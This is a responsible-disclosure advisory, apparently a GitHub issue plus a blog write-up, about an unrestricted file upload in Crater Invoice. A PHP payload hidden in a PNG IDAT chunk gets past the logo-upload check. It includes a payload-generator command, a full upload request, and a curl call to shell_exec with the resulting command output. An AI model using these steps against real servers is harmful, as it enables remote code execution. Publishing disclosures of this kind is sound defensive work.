More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

| **Description** This is a responsible disclosure. I've contacted the maintainers through huntr.dev on april and they have acknowledged the vulnerability but the project seems to be in maintanance for almost a year. I've given them 5 months to fix(they didnt respond after acknowledging it) and think I should let others be aware of this,  **Describe the bug** In latest or 6.0.6 version of crater, superadmin is able to upload PHP file instead of an image using the Company Logo upload feature. The Base64Mime.php checking function can be bypassed by embedding a valid PHP payload into an IDAT image chunk. I have used <https://github.com/huntergregal/PNG-IDAT-Payload-Generator> for the poc.  `python3 .\generate.py -m php -o test.png`  Then use superadmin account to upload, change .png to .php in Burp .  ``` POST /api/v1/company/upload-logo HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Authorization: undefined company: 1 X-XSRF-TOKEN: eyJpdiI6IjlmTDJpdzRNUUFCNVlObXUvbDN4c2c9PSIsInZhbHVlIjoidjJCdVlXemtlQ0NHbzFmTC93dzNxZzVhd0IrOFlYd1d6aUxCZWFJWElTd3pDTEdoTlNUT1o1S2NRMWp5cWRhckJVejhiZVArRThPbGxzSGRsVTg5QkJBY1RKdDhnOEt6MkxadHM0MGRPNkErZVRnRkJaenVXZXVrMHVlSkZMVzciLCJtYWMiOiJmMmE2ZWRkNjE4YzZmYTE5NjY1ODgxYWEzNDhkOGJlNzA1MmIxYWQyYmI3MjM2YmRiNjc2NzBmMDE2NDY3NTVhIiwidGFnIjoiIn0= Content-Type: multipart/form-data; boundary=---------------------------5545470669814198892302696268 Content-Length: 552 Origin: http://localhost Connection: close Referer: http://localhost/admin/settings/company-info Cookie: XSRF-TOKEN=eyJpdiI6IjlmTDJpdzRNUUFCNVlObXUvbDN4c2c9PSIsInZhbHVlIjoidjJCdVlXemtlQ0NHbzFmTC93dzNxZzVhd0IrOFlYd1d6aUxCZWFJWElTd3pDTEdoTlNUT1o1S2NRMWp5cWRhckJVejhiZVArRThPbGxzSGRsVTg5QkJBY1RKdDhnOEt6MkxadHM0MGRPNkErZVRnRkJaenVXZXVrMHVlSkZMVzciLCJtYWMiOiJmMmE2ZWRkNjE4YzZmYTE5NjY1ODgxYWEzNDhkOGJlNzA1MmIxYWQyYmI3MjM2YmRiNjc2NzBmMDE2NDY3NTVhIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6ImhXdzFQMStlL0lTdHJTekQzTjdCcHc9PSIsInZhbHVlIjoiRnRjWFd5RERVNisrOVQ3Uk94S25DTWVkK1pjZTJUclQzYWV0ZXpQUG93OEhKd0RWV01XZmQ1ZmhlTGVqeDdaSGhPY3NUeDVvTm9xSXYzTVp6anFlbWxRb3JsZlR3YURscXo1UVh5My9nbCt6Y0F2T1Vsd3dESnhsQzZjSkQvR3oiLCJtYWMiOiI3M2ZjZjM0YmZhMTAzMGQwZmVlYTVmMjczNmEyYWUwZDY2MDNmZTcyNmQxMWFhMTk4YWRlMjJiOTNjNmQzZjIxIiwidGFnIjoiIn0%3D; dnXIFPcUKrLKVUG7aQgkhpLkCDcjlGIkv70LWxmf=eyJpdiI6Ilp4VGVCT3lheVViR1FFM0dsaTZkVHc9PSIsInZhbHVlIjoiTkpHTC9Cdzg0djRPWjFESitvdndYMVhRMFpCQ2pTUHRSQnVTOTVNMWh2T1l6SDR0QThIWDhZVDlTNmpsR085ZVJLSFFWRTR6dDdrVEhncTB6NlRQUzhLbHU1ZXJHdmV5WDBsU2U0R0lEeHNzM29abDBFczNDWTBVYUtoQyt0RlJlMmhvY0M2TVdaZFRqbkJvdWd1Zzk2QUxzUzZnb3BlbDZXOUhMeDQ1RkNTeUFwTit4QndOTnEzQzVCejFDbnNPUzBoc0N4dEh3UXBrVDBBSmdFa1dib0M0MHZZS05USWlMQnVFd2VJdmJIV2lhNXJRaGp0OTc2cUZQVXhTTEgzZE9JWWk3NjkrTGRNSnR2SWVwZ25YQjdVTWsySmdaYjQzc1c2KzBYc3lXYmUva3dZanR5Y3FsaGhzbUw5b2wvTExLR3huNHhsdDhKTG9rYjYwMUlrZlNRYzZ0aGVaQWpzSG0veStGYWorNWUyYzRZQ0lzN3NOMzRKV3BnZG1mZ1RsUG8ybk9SSlBhMEEzajZqdDU3OGIzV3RUd3hoQll1WisrbytpdUVMbzUvNm0zazNyWHVDYUZEbStzVFJXd2dDU3ZYY0xvZ0hrZTRNMG1vRzRURXdXanc9PSIsIm1hYyI6IjE5OGJhMTNjM2U5YTU2M2Q4Y2ZjOTRmYWNiOTU4YTMwZmVmMjY1YWJiZjNlYzc3YjI0YzAxODgzN2Q1N2RkZDciLCJ0YWciOiIifQ%3D%3D Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin   -----------------------------5545470669814198892302696268 Content-Disposition: form-data; name="company_logo"  {"name":"test.php","data":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAIAAAD8GO2jAAAAVklEQVR4nGNcPD89JF9HRVRbMF0oJF9QT1NUWzFdKTs/PljAc143k/yPi9t+X9N9qif38ePJv1/vBnyyMFiXHMwwCkbBKBgFo2AUjIJRMApGwSgYfgAAI0oXArodV7QAAAAASUVORK5CYII="} -----------------------------5545470669814198892302696268 Content-Disposition: form-data; name="is_company_logo_removed"  false -----------------------------5545470669814198892302696268--  ```  Then `curl -XPOST -d '1=uname -a' 'http://localhost/storage/1/test.php?0=shell_exec' --output o && cat o`  ``` �PNG ▒ IHDR �▒��VIDATx�c\Linux 11f1e6093117 6.1.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.12-1kali2 (2023-02-23) x86_64 GNU/Linux X�s^7�����~_�}�'���ɿ_�|�0X��0 F�(▒�`��Q0 F�(▒~#J�W�IEND�B`�       ```  **Expected behavior** Php file shouldnt be allowed to be uploaded.

| [@asylumdx](https://github.com/asylumdx) have they still not responded!? Thanks for raising this. that being said the software appears to be abandonware, since the promise of security maintenance is not being upheld.  [#1265](https://github.com/crater-invoice-inc/crater/issues/1265) |

## **Vendor/Product Description**

Crater is an open-source web & mobile app that helps you track expenses,
payments & create professional invoices & estimates.

Source: https://github.com/crater-invoice/crater

## **Vulnerability Overview**

Crater Invoice is vulnerable to unrestricted file upload. The lack of input validation enabled dangerous file types to be uploaded to the server. The Base64Mime checking class can be
bypassed by embedding a valid PHP payload into an IDAT image chunk. A user
with superadmin privileges is able to upload the crafted payload through
company logo at /api/v1/company/upload-logo.

The exploitation of this vulnerability requires a superadmin account access to be gained beforehand. Access to such privilege via malicious approach may also result other impacts which are not in the scope of this article. In this article, we focused on exploiting the vulnerability that enables access to the underlying operating system via the unrestricted file upload. What we wanted to demonstrate here is the code execution via IDAT image processing.

The fact that the vulnerability required superadmin privilege for authentication, which could cause a significant problem.

## **Technical Details**

The uploadCompanyLogo function will take the request sent to /api/v1/company/upload-logo and uses CompanyLogoRequest to process the image that has been encoded in base64. Since the filename is taken directly without any extension validation, we should be able to upload an executable php file if we manage to bypass the CompanyLogoRequest class.

 Crater Invoice allows a logged-in user with superadmin privilege to
upload a company logo via the company settings page. The upload request
goes to /api/v1/company/upload-logo endpoint.  [![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj1nFS6Xm4OY8nGi3OuU8du6Q5UhQHJFesdVSvMDR7aMsVHMPkoG0DAe5zgR8Wy-5DVxyBLYPq29nbPVbq2ny3wBE3TNBAmkF6BuShgFDI9uFgOlMM5EWxPGMLIJvz0ZIKY8SAovHVR67_TG8tA7uAELWL-Fx329OovU78iAcsvRMLzbzUIHi2a_eMiGoc/s16000/uploadcompanylogo.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj1nFS6Xm4OY8nGi3OuU8du6Q5UhQHJFesdVSvMDR7aMsVHMPkoG0DAe5zgR8Wy-5DVxyBLYPq29nbPVbq2ny3wBE3TNBAmkF6BuShgFDI9uFgOlMM5EWxPGMLIJvz0ZIKY8SAovHVR67_TG8tA7uAELWL-Fx329OovU78iAcsvRMLzbzUIHi2a_eMiGoc/s1810/uploadcompanylogo.png)

File: /app/Http/Controllers/V1/Admin/Settings/CompanyController.php - Line 66-92
Reviewing the code above, we learned that this is handled by uploadCompanyLogo function which uses CompanyLogoRequest to process the image that has been encoded in base64.

File:/app/Http/Requests/CompanyLogoRequest.php - Line 8-34 As shown above, the CompanyLogoRequest utilizes a class, Base64Mime, to verify the file extension of the uploaded image against an array of file extension namely gif, jpg and png. As observed earlier in uploadCompanyLogo function, there is no validation on the file extension in place - we may be able to upload a file with .php extension provided we are able to bypass the CompanyLogoRequest class which which is Base64Mime.

File:/app/Rules/Base64Mime.php - Line 7-77 Diving into the Base64Mime class, we learned that the class check for the following:

* Is a valid JSON format. (line 14-18)
* Matches the pattern of a base64-encoded file. (line 20-24)
* Decoded content can be identified as a valid file format using the finfo extension. (line 32-39)
* Return true if the finfo results is within the accepted extensions(gif,jpg,png). (line 41-51)

The finfo extension, provides functions that allow us to inspect the contents of a file and determine its MIME type and encoding(similar to the file command in linux). We are able to bypass the checks by using a technique that was commonly used to bypass phpgd checks where we put the payload in IDAT chunk of the image and it was successful.
## **Proof of Concept**

Clone repo from
[PNG-IDAT-Payload-Generator](https://github.com/huntergregal/PNG-IDAT-Payload-Generator). To generate the IDAT PHP payload we use

```
python3 .\generate.py -m php -o test.png
```

Then use superadmin account to upload a company logo, intercept request, and change the extension of *.png* to *.php.*

```
